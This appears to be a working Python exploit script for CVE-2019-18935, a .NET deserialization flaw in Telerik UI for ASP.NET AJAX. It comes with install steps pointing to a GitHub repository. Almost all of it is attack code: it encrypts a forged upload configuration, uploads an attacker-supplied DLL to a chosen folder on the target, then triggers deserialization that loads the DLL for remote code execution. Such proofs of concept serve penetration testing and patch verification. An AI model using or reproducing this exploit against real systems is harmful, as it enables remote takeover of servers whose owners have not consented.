#!/usr/bin/env python3
# origin : https://github.com/noperator/CVE-2019-18935
# INSTALL: 
# git clone https://github.com/noperator/CVE-2019-18935.git && cd CVE-2019-18935
#  python3 -m venv env
#  source env/bin/activate
#  pip3 install -r requirements.txt

# Import encryption routines.
from sys import path
path.insert(1, 'RAU_crypto')
from RAU_crypto import RAUCipher

from argparse import ArgumentParser
from json import dumps, loads
from os.path import basename, splitext
from pprint import pprint
from requests import post
from requests.packages.urllib3 import disable_warnings
from sys import stderr
from time import time
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(category=InsecureRequestWarning)

def send_request(files):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
        'Connection': 'close',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1'
    }
    response = post(url, files=files, verify=False, headers=headers)
    try:
        result = loads(response.text)
        result['metaData'] = loads(RAUCipher.decrypt(result['metaData']))
        pprint(result)
    except:
        print(response.text)

def build_raupostdata(object, type):
    return RAUCipher.encrypt(dumps(object)) + '&' + RAUCipher.encrypt(type)

def upload():

    # Build rauPostData.
    object = {
        'TargetFolder': RAUCipher.addHmac(RAUCipher.encrypt(''), ui_version),
        'TempTargetFolder': RAUCipher.addHmac(RAUCipher.encrypt(temp_target_folder), ui_version),
        'MaxFileSize': 0,
        'TimeToLive': {  # These values seem a bit arbitrary, but when they're all set to 0, the payload disappears shortly after being written to disk.
            'Ticks': 1440000000000,
            'Days': 0,
            'Hours': 40,
            'Minutes': 0,
            'Seconds': 0,
            'Milliseconds': 0,
            'TotalDays': 1.6666666666666666,
            'TotalHours': 40,
            'TotalMinutes': 2400,
            'TotalSeconds': 144000,
            'TotalMilliseconds': 144000000
        },
        'UseApplicationPoolImpersonation': False
    }
    type = 'Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version=' + ui_version + ', Culture=neutral, PublicKeyToken=121fae78165ba3d4'
    raupostdata = build_raupostdata(object, type)
    
    with open(filename_local, 'rb') as f:
        payload = f.read()
    
    metadata = {
        'TotalChunks': 1,
        'ChunkIndex': 0,
        'TotalFileSize': 1,
        'UploadID': filename_remote  # Determines remote filename on disk.
    }
    
    # Build multipart form data.
    files = {
        'rauPostData': (None, raupostdata),
        'file': (filename_remote, payload, 'application/octet-stream'),
        'fileName': (None, filename_remote),
        'contentType': (None, 'application/octet-stream'),
        'lastModifiedDate': (None, '1970-01-01T00:00:00.000Z'),
        'metadata': (None, dumps(metadata))
    }
    
    # Send request.
    print('[*] Local payload name: ', filename_local, file=stderr)
    print('[*] Destination folder: ', temp_target_folder, file=stderr)
    print('[*] Remote payload name:', filename_remote, file=stderr)
    print(file=stderr)
    send_request(files)

def deserialize():

    # Build rauPostData.
    object = {
        'Path': 'file:///' + temp_target_folder.replace('\\', '/') + '/' + filename_remote
    }
    type = 'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=' + net_version + ', Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
    raupostdata = build_raupostdata(object, type)
    
    # Build multipart form data.
    files = {
        'rauPostData': (None, raupostdata),  # Only need this now.
        '': ''  # One extra input is required for the page to process the request.
    }
    
    # Send request.
    print('\n[*] Triggering deserialization for .NET v' + net_version + '...\n', file=stderr)
    start = time()
    send_request(files)
    end = time()
    print('\n[*] Response time:', round(end - start, 2), 'seconds', file=stderr)

if __name__ == '__main__':
    parser = ArgumentParser(description='Exploit for CVE-2019-18935, a .NET deserialization vulnerability in Telerik UI for ASP.NET AJAX.')
    parser.add_argument('-t', dest='test_upload', action='store_true', help="just test file upload, don't exploit deserialization vuln")
    parser.add_argument('-v', dest='ui_version', required=True, help='software version')
    parser.add_argument('-n', dest='net_version', default='4.0.0.0', help='.NET version')
    parser.add_argument('-p', dest='payload', required=True, help='mixed mode assembly DLL')
    parser.add_argument('-f', dest='folder', required=True, help='destination folder on target')
    parser.add_argument('-u', dest='url', required=True, help='https://<HOST>/Telerik.Web.UI.WebResource.axd?type=rau')
    args = parser.parse_args()

    temp_target_folder = args.folder.replace('/', '\\')
    ui_version = args.ui_version
    net_version = args.net_version
    filename_local = args.payload
    filename_remote = str(time()) + splitext(basename(filename_local))[1]
    url = args.url

    upload()

    if not args.test_upload:
        deserialize()

